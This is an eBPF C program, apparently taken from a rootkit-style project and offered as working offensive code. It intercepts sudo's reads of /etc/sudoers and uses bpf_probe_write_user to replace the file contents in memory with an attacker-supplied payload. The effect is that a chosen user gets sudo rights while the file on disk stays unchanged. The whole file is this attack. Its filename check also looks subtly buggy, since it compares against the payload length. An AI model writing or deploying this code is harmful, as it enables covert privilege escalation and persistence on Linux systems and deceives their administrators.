#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// map to hold the file descriptor of "openat" calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

//map to hold the buffer address of "read" calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

const volatile int target_ppid = 0;

const volatile int uid = 0;

const volatile int payload_len = 0;

const volatile char payload[max_payload_len];

/*
int openat(int dirfd, const char *pathname, int flags, ...
                  /* mode_t mode  );*/

SEC("tp/syscalls/sys_enter_openat")
int handle_openat(struct trace_event_raw_sys_enter *ctx) {
    //print fmt: "dfd: 0x%08lx, filename: 0x%08lx, flags: 0x%08lx, mode: 0x%08lx", 
    //((unsigned long)(REC->dfd)), ((unsigned long)(REC->filename)), ((unsigned long)(REC->flags)), ((unsigned long)(REC->mode))
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    //check if the process is the target process
    if(target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)(bpf_get_current_task());
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if(ppid != target_ppid) {
            return 0;
        }
    }


    //判断sudo命令
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const int sudo_len = 5;
    // c ->"sudo\0" len = 5
    const char *sudo_str = "sudo";
    //strcmp(comm, sudo_str);
    for(int i = 0; i < sudo_len; i++) {
        if(comm[i] != sudo_str[i]) {
            return 0;
        }
    }

    //判断路径
    const char *sudoers = "/etc/sudoers";
    char filename[sudoers_len];
    bpf_probe_read_user(&filename, sudoers_len, (void*)ctx->args[1]);

    for(int i = 0; i < payload_len; i++) {
        if(filename[i] != sudoers[i]) {
            return 0;
        }
    }

    bpf_printk("Comm %s\n", comm);
    bpf_printk("Filename %s\n", filename);

    //restrict
    if(uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if(uid != current_uid) {
            return 0;
        }
    }

    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx) {
    //print fmt: "0x%lx", REC->ret
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if(check == 0) {
        return 0;
    }

    int pid = pid_tgid >> 32;

    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);
    
    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx) {
    //print fmt: "fd: 0x%08lx, buf: 0x%08lx, count: 0x%08lx", 
    //((unsigned long)(REC->fd)), ((unsigned long)(REC->buf)), ((unsigned long)(REC->count))
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int *pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if(pfd == 0) {
        return 0;
    }

    int pid = pid_tgid >> 32;

    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if(map_fd != fd) {
        return 0;
    }

    long unsigned int buff_addr = (long unsigned int)ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    size_t buff_len = (size_t)ctx->args[2]; //count
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
    //print fmt: "0x%lx", REC->ret
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if(pbuff_addr <= 0) {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if(buff_addr <= 0) {
        return 0;
    }

    //this is the amount of data from the read call
    if(ctx->ret <= 0) {
        return 0;
    }

    long int read_size = ctx->ret;

    if(read_size > payload_len) {
        return 0;
    }

    //overwrite the buffer with the payload

    char local_buff[max_payload_len] = {0x00};
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);

    for(unsigned int i = 0; i < max_payload_len; i++) {
        if(i >= payload_len) {
            local_buff[i] = '#';
        } else {
            local_buff[i] = payload[i];
        }
    }

    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);

    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if(e) {
        e->success = (ret == 0); //是否完成了修改
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx) {
    //print fmt: "0x%lx", REC->ret
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if(check == 0) {
        return 0;
    }

    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    bpf_printk("Close pid %d, maps about pid %d cleaned up\n", pid, pid);    
    return 0;
}